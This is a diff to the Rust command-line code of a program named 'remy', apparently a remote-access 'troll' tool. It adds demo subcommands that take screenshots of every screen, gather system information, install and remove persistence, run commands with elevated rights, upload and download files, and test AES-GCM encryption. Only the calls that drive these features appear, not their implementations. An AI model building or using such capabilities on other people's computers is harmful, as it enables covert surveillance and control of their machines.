@@ -85,7 +85,7 @@ enum Commands {
     /// Show a demo of troll commands (safe to run)
     Demo {
         /// Which troll command to demo
-        #[arg(value_parser = ["rickroll", "speak", "popup"])]
+        #[arg(value_parser = ["rickroll", "speak", "popup", "wallpaper", "mouse", "screenshot", "sysinfo", "persist", "exec", "files", "crypto"])]
         command: String,
     },
 }
@@ -189,6 +189,106 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                     match commands::troll::popup("You've been remy'd!", 1) {
                         Ok(msg) => println!("{}", msg),
                         Err(e) => println!("Error: {}", e),
+                    }
+                }
+                "wallpaper" => {
+                    println!("Changing wallpaper to a fun image...");
+                    match commands::troll::change_wallpaper("https://i.imgur.com/3ZQZ3Zm.jpg") {
+                        Ok(msg) => println!("{}", msg),
+                        Err(e) => println!("Error: {}", e),
+                    }
+                }
+                "mouse" => {
+                    println!("Mouse chaos for 3 seconds...");
+                    match commands::troll::mouse_chaos(3) {
+                        Ok(msg) => println!("{}", msg),
+                        Err(e) => println!("Error: {}", e),
+                    }
+                }
+                "screenshot" => {
+                    println!("Taking screenshot...");
+                    match commands::screenshot::take_screenshot() {
+                        Ok(b64) => println!("Screenshot captured: {} bytes (base64)", b64.len()),
+                        Err(e) => println!("Error: {}", e),
+                    }
+                    println!("\nTaking all screens...");
+                    match commands::screenshot::take_all_screenshots() {
+                        Ok(screens) => {
+                            for (i, b64) in screens {
+                                println!("Screen {}: {} bytes", i, b64.len());
+                            }
+                        }
+                        Err(e) => println!("Error: {}", e),
+                    }
+                }
+                "sysinfo" => {
+                    println!("Gathering system info...");
+                    match commands::sysinfo::get_system_info() {
+                        Ok(info) => println!("{}", info),
+                        Err(e) => println!("Error: {}", e),
+                    }
+                }
+                "persist" => {
+                    println!("Testing persistence (install then remove)...");
+                    match commands::persist::install_persistence() {
+                        Ok(msg) => {
+                            println!("Install: {}", msg);
+                            match commands::persist::remove_persistence() {
+                                Ok(msg) => println!("Remove: {}", msg),
+                                Err(e) => println!("Remove error: {}", e),
+                            }
+                        }
+                        Err(e) => println!("Install error: {}", e),
+                    }
+                }
+                "exec" => {
+                    println!("Executing 'whoami'...");
+                    match commands::exec::execute_command("whoami") {
+                        Ok(output) => println!("Output: {}", output),
+                        Err(e) => println!("Error: {}", e),
+                    }
+                    println!("\nExecuting 'uname -a' (elevated)...");
+                    match commands::exec::execute_elevated("uname -a") {
+                        Ok(output) => println!("Output: {}", output),
+                        Err(e) => println!("Error: {}", e),
+                    }
+                }
+                "files" => {
+                    println!("Listing /tmp...");
+                    match commands::files::list_directory("/tmp") {
+                        Ok(listing) => println!("{}", listing),
+                        Err(e) => println!("Error: {}", e),
+                    }
+                    println!("\nUploading test file...");
+                    let test_data = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, b"Hello from remy!");
+                    match commands::files::upload_file("/tmp/remy_test.txt", &test_data) {
+                        Ok(msg) => println!("{}", msg),
+                        Err(e) => println!("Error: {}", e),
+                    }
+                    println!("\nDownloading test file...");
+                    match commands::files::download_file("/tmp/remy_test.txt") {
+                        Ok(b64) => {
+                            let decoded = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, &b64).unwrap_or_default();
+                            println!("Content: {}", String::from_utf8_lossy(&decoded));
+                        }
+                        Err(e) => println!("Error: {}", e),
+                    }
+                    let _ = std::fs::remove_file("/tmp/remy_test.txt");
+                }
+                "crypto" => {
+                    println!("Testing AES-GCM encryption...");
+                    let key = crypto::Crypto::generate_key();
+                    let c = crypto::Crypto::new(&key);
+                    let plaintext = b"Secret message from remy!";
+                    match c.encrypt(plaintext) {
+                        Ok(ciphertext) => {
+                            println!("Encrypted: {}...", &ciphertext[..50.min(ciphertext.len())]);
+                            match c.decrypt(&ciphertext) {
+                                Ok(decrypted) => println!("Decrypted: {}", String::from_utf8_lossy(&decrypted)),
+                                Err(e) => println!("Decrypt error: {:?}", e),
+                            }
+                        }
+                        Err(e) => println!("Encrypt error: {:?}", e),
                     }
                 }
                 _ => println!("Unknown command"),
